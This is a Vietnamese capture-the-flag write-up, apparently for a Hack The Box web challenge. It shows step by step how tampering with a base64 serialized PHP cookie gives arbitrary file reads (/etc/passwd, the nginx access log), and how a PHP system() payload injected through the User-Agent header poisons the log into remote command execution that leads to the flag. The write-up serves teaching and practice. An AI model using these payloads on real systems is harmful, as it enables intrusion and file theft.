Trong cookie của request thấy có `PHPSESSID`:
```
Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoxNToiL3d3dy9pbmRleC5odG1sIjt9
```
Decode bằng base64 ta được:
```
O:9:"PageModel":1:{s:4:"file";s:15:"/www/index.html";}
```
Sửa lại như sau:
```
O:9:"PageModel":1:{s:4:"file";s:11:"/etc/passwd";}
```
Encode bằng base64:
```
Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoxMToiL2V0Yy9wYXNzd2QiO30
```
Gửi lại request:
```
root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
man:x:13:15:man:/usr/man:/sbin/nologin
postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
cyrus:x:85:12::/usr/cyrus:/sbin/nologin
vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
www:x:1000:1000:1000:/home/www:/bin/sh
nginx:x:100:101:nginx:/var/lib/nginx:/sbin/nologin
```
Ok, ta đã đọc được file `/etc/password`, giờ chỉ cần thay đường dẫn thành đường dẫn file flag là xong. Tuy nhiên flag lại là random filename với dạng `flag_xxxxx`, vậy làm sao để biết chính xác tên file là gì? Không lẽ lại brute-force flag filename? (._."), cách này không khả thi.

Tiếp tục xem source code, ở file `nginx.conf` trong config ta thấy ứng dụng có lưu access_log:
```conf
http {
    server_tokens off;
    log_format docker '$remote_addr $remote_user $status "$request" "$http_referer" "$http_user_agent" ';
    access_log /var/log/nginx/access.log docker;
```

Access log lấy thông tin của một số header và lưu vào file mà không hề validate, bây giờ hãy thử đọc file `/var/log/nginx/access.log` xem thế nào.

Sửa lại PHPSESSID:
```
O:9:"PageModel":1:{s:4:"file";s:25:"/var/log/nginx/access.log";}
```
Encode bằng base64:
```
Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoyNToiL3Zhci9sb2cvbmdpbngvYWNjZXNzLmxvZyI7fQ
```
Gửi lại request:
```
167.172.55.94 - 500 "GET / HTTP/1.1" "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36" 
167.172.55.94 - 500 "GET / HTTP/1.1" "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36" 
167.172.55.94 - 500 "GET / HTTP/1.1" "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36" 
```
Bây giờ ta thử inject shell vào header xem thế nào, ta sẽ thử inject vào User-Agent:
```
User-Agent: <?php system('ls') ?>
Cookie: PHPSESSID=Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoyNToiL3Zhci9sb2cvbmdpbngvYWNjZXNzLmxvZyI7fQ
```
Response trả về như sau:
```
167.172.55.94 - 200 "GET / HTTP/1.1" "-" "index.html
index.php
models
static
```

Đến đây thì giờ tìm tên file flag và đọc thôi:
```
User-Agent: <?php system('ls%20/') ?>
Cookie: PHPSESSID=Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoyNToiL3Zhci9sb2cvbmdpbngvYWNjZXNzLmxvZyI7fQ
```
```
167.172.55.94 - 200 "GET / HTTP/1.1" "-" "bin
dev
entrypoint.sh
etc
flag_tiPsT
home
lib
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
www
```
Sửa lại PHPSESSID:
```
O:9:"PageModel":1:{s:4:"file";s:11:"/flag_tiPsT";}
```
Encode bằng base64:
```
Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoxMToiL2ZsYWdfdGlQc1QiO30
```
Gửi lại request:
```
HTB{P0i5on_1n_Cyb3r_W4rF4R3?!}
```